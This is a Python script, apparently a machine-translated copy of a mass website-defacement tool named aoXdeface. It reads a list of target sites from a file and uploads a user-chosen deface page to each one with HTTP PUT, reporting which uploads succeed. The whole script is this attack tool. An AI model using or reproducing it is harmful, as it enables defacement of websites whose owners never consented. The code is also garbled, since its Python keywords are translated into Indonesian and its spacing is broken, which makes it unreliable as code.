# - * - coding: utf-8 - * -

coba :
   permintaan impor
   os.path impor
   impor sys
kecuali  ImportError :
   keluar ( " instal permintaan dan coba lagi ... " )

spanduk =  "" "
 █████╗ ██╗ ██╗██████╗ Penulis: Ms.ambari
██╔══██╗╚██╗██╔╝██╔══██╗ Tanggal: 2018-12-01
███████║ ╚███╔╝ ██║ ██║ Alat: aoXdeface V.1.0
██╔══██║ ██╔██╗ ██║ ██║ Github: / Ranginang67
██║ ██║██╔╝ ██╗██████╔╝ youtube: Ms.ambari
╚═╝ ╚═╝╚═╝ ╚═╝╚═════╝ 
"" "

b =  ' \ 033 [31m '
h =  ' \ 033 [32m '
m =  ' \ 033 [00m '

def  x ( tetew ):
   ipt =  ' '
   jika sys.version_info.major >  2 :
      ipt =  input (tetew)
   lain :
      ipt =  raw_input (tetew)
   
   kembali  str (ipt)

def  aox ( script , target_file = " target.txt " ):
   op =  buka (skrip, " r " ) .baca ()
   dengan  terbuka (target_file, " r " ) sebagai target:
      target = target.readlines ()
      s = requests.Session ()
      print ( " mengunggah file ke % d situs web " % ( len (target)))
      untuk web di target:
         coba :
            site = web.strip ()
            jika site.startswith ( " http: // " ) adalah  False :
               situs =  " http: // "  + situs
            req = s.put (situs + " / " + skrip, data = op)
            jika req.status_code <  200  atau req.status_code > =  250 :
               cetak (m + " [ " + b + " FAILED! " + m + " ] % s / % s " % (situs, skrip))
            lain :
               cetak (m + " [ " + h + " SUCCESS " + m + " ] % s / % s " % (situs, skrip))

         kecuali requests.exceptions.RequestException:
            terus
         kecuali  KeyboardInterrupt :
            cetak ; keluar ()

def  main ( __bn__ ):
   cetak (__bn__)
   sementara  True :
      coba :
         a = x ( " Masukkan nama skrip deface Anda: " )
         jika  tidak os.path.isfile (a):
            print ( " file ' % s ' tidak ditemukan " % (a))
            terus
         lain :
            istirahat
      kecuali  KeyboardInterrupt :
         cetak ; keluar ()

   aox (a)

jika  __name__  ==  " __main__ " :
    utama (spanduk)
